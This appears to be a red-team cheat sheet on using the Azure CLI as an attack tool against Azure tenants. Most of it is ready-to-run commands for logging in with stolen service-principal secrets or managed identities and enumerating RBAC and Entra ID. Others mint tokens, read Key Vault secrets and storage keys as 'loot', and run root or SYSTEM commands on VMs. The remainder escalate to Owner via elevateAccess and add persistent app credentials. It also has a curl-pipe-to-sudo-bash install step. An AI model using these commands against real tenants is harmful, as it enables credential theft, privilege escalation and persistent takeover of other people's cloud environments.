# azure-cli

**Tags:** #Cloud #Azure #ARM #EntraID #enumeration #privesc #keyvault #storage

Microsoft's official cross-platform CLI for Azure (`az`). Primarily an administration tool,
it's equally an offensive one: it authenticates with stolen service-principal secrets,
managed-identity tokens or a user's refresh token, and drives the **ARM resource plane**
(`management.azure.com`) — subscriptions, VMs, storage, Key Vault, role assignments. On an
engagement it's the fastest way to enumerate and abuse Azure RBAC once you hold any
credential, it **mints access tokens** for other Azure APIs, and it wraps several escalation
primitives (`elevateAccess`, `vm run-command`) behind one command.

**Source:** https://github.com/Azure/azure-cli · docs https://learn.microsoft.com/cli/azure/
**Install:** `curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash` (Debian/Kali) or `pipx install azure-cli`

```bash
# --- Authenticate ---
az login                                                        # interactive / device code
az login --use-device-code                                     # headless / no browser on this host
az login --service-principal -u <app-id> -p <secret> --tenant <tenant-id>
az login --service-principal -u <app-id> -p cert.pem --tenant <tenant-id>   # cert instead of secret
az login --identity                                            # use the host VM's managed identity (IMDS)
az login --identity --username <client-id-of-UAMI>             # a specific user-assigned identity
```

---

## Who Am I / Context

```bash
az account show                                   # current subscription + tenant + logged-in identity
az account list -o table                          # all subscriptions in scope
az account set --subscription <sub-id>            # pin a subscription for later commands
az ad signed-in-user show                         # your Entra user object (fails if you're an SP)
```

---

## Enumerate — Resource Plane (RBAC)

```bash
az resource list -o table
az role assignment list --all -o table                         # every RBAC assignment you can see
az role assignment list --assignee <oid> --all -o table        # a specific principal's roles

# Hunt dangerous roles/scopes: who holds Owner / Contributor / User Access Administrator
az role assignment list --all --query "[?roleDefinitionName=='Owner' || roleDefinitionName=='User Access Administrator']" -o table

# Custom roles with over-broad actions (e.g. '*', 'Microsoft.Authorization/*/write')
az role definition list --custom-role-only true --query "[].{Name:roleName, Actions:permissions[0].actions}" -o json
```

## Enumerate — Entra ID (via Graph)

```bash
az ad user list --query "[].{u:userPrincipalName,id:id}" -o table
az ad group list -o table
az ad sp list --all --query "[].{name:displayName,appId:appId}" -o table   # service principals
az ad app list --all -o table                                  # app registrations
# Raw Graph when there's no dedicated command
az rest --method get --url "https://graph.microsoft.com/v1.0/users?\$top=999"
```

---

## Mint Tokens for Other APIs (loot & lateral use)

`az` will hand you a bearer token for any Azure resource your principal can reach — use it
with `curl`, Burp, or other tooling. This is the payoff of a stolen managed identity.

```bash
az account get-access-token                                              # ARM (management.azure.com)
az account get-access-token --resource https://graph.microsoft.com/     # Microsoft Graph
az account get-access-token --resource https://vault.azure.net           # Key Vault
az account get-access-token --resource https://storage.azure.com/        # Storage
# --resource-type is a shortcut alias for common ones: ms-graph, arm, aad-graph, ...
az account get-access-token --resource-type ms-graph -o tsv --query accessToken
```

---

## Key Vault Looting

Once you have `get`/`list` data-plane access (or the `Key Vault Administrator` RBAC role),
vaults are a top prize — they hold DB passwords, app secrets, private keys, certs.

```bash
az keyvault list -o table                                      # vaults in scope
az keyvault secret list --vault-name <vault> -o table          # secret names
az keyvault secret show --vault-name <vault> -n <name> --query value -o tsv   # the secret value
az keyvault key list --vault-name <vault> -o table
az keyvault certificate list --vault-name <vault> -o table
```

---

## Storage Account Looting

```bash
az storage account list -o table
az storage account keys list -g <rg> -n <account> -o table                 # the account keys (full access)
az storage account show-connection-string -g <rg> -n <account> -o tsv      # connection string
az storage container list --account-name <account> --auth-mode login -o table
az storage blob list  --account-name <account> -c <container> --auth-mode login -o table
az storage blob download --account-name <account> -c <container> -n <blob> -f ./loot
```

---

## Code Execution on VMs (ARM → guest, no network path needed)

`vm run-command` runs as **SYSTEM (Windows)** / **root (Linux)** via the Azure agent — you
only need the `Microsoft.Compute/.../runCommand/action` permission, not guest creds.

```bash
# Linux
az vm run-command invoke -g <rg> -n <vm> --command-id RunShellScript      --scripts "id"
# Windows
az vm run-command invoke -g <rg> -n <vm> --command-id RunPowerShellScript --scripts "whoami"
# Multi-line / staged payload
az vm run-command invoke -g <rg> -n <vm> --command-id RunShellScript --scripts @payload.sh
```

The command output (stdout/stderr) is returned inline in the JSON response — this one *is*
readable, unlike Invoke-TheHash-style blind exec.

---

## Escalation & Persistence Primitives

```bash
# Global Admin → User Access Administrator at ROOT scope (/) — then grant yourself Owner anywhere
az rest --method post --url "/providers/Microsoft.Authorization/elevateAccess?api-version=2016-07-01"
az role assignment create --assignee <your-oid> --role Owner --scope /subscriptions/<sub>

# Persistence: add a new client secret to an app registration you can write to
az ad app credential reset --id <appId> --append --years 2       # prints a usable secret
# Persistence: add a service principal to a privileged directory role / group you control
az ad group member add --group <groupId> --member-id <spOrUserId>
```

> [!warning] `az` writes tokens to `~/.azure/` in cleartext (`accessTokens.json` on older versions, `msal_token_cache.json` on newer). On a compromised admin workstation that directory is itself a credential to loot; on your own box, clear it after an engagement.

> [!note] **See also**
> Services this tool is used against in this vault: [[Services/Active Directory/Entra ID|Entra ID]] — service-principal auth, `elevateAccess`, IMDS token use, and VM RunCommand for the identity→resource-plane pivot. [[Services/Web Services/Azure DevOps|Azure DevOps]] — `az devops`/`az pipelines` enumeration of repos, pipelines, service connections and variable groups with a PAT.
> Related tooling: [[Tools/Cloud/MicroBurst|MicroBurst]] (automates the IMDS/RunCommand/storage sweep `az` does by hand), [[Tools/Cloud/AADInternals|AADInternals]] (the identity/Entra side), [[Tools/Cloud/BARK|BARK]] (`*-AzureRM*` primitives over the same ARM API), [[Tools/Cloud/ROADtools|ROADtools]] (token manipulation feeding `az login`), [[Tools/Cloud/AzureHound|AzureHound]] (BloodHound graph of the RBAC/Entra relationships you enumerate here).

---

*Created: 2026-09-22*
*Updated: 2026-09-28*
*Model: claude-opus-4-8*
